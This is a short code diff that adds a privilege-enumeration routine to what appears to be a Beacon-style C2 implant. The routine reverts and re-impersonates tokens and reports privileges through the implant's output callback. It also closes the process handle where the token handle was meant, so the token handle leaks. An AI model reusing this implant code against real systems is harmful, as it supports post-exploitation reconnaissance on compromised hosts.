@@ -464,4 +464,39 @@ void IdentityGetPrivilegesInternal(char* buffer, int length, HANDLE hToken, form
 		}
 	}
 }
+
+void IdentityGetPrivileges(char* buffer, int length)
+{
+	formatp locals;
+	BeaconFormatAlloc(&locals, 0x8000);
+	if(gIdentityDomain)
+	{
+		IdentityRevertToken();
+		IdentityGetPrivilegesInternal(buffer, length, gIdentityToken, &locals);
+		IdentityImpersonateToken();
+	}else
+	{
+		HANDLE hToken;
+
+		HANDLE hProcess = GetCurrentProcess();
+		if(OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
+			IdentityGetPrivilegesInternal(buffer, length, hToken, &locals);
+			CloseHandle(hProcess);
+		}else
+		{
+			LERROR("Could not open process token");
+			BeaconErrorNA(ERROR_OPEN_PROCESS_TOKEN_PRIVS_FAILED);
+		}
+
+	}
+
+
+	if (BeaconDataLength(&locals))
+	{
+		int size = BeaconDataLength(&locals);
+		char* data = BeaconDataOriginal(&locals);
+		BeaconOutput(CALLBACK_OUTPUT, data, size);
+	}
+
+	BeaconFormatFree(&locals);
 }
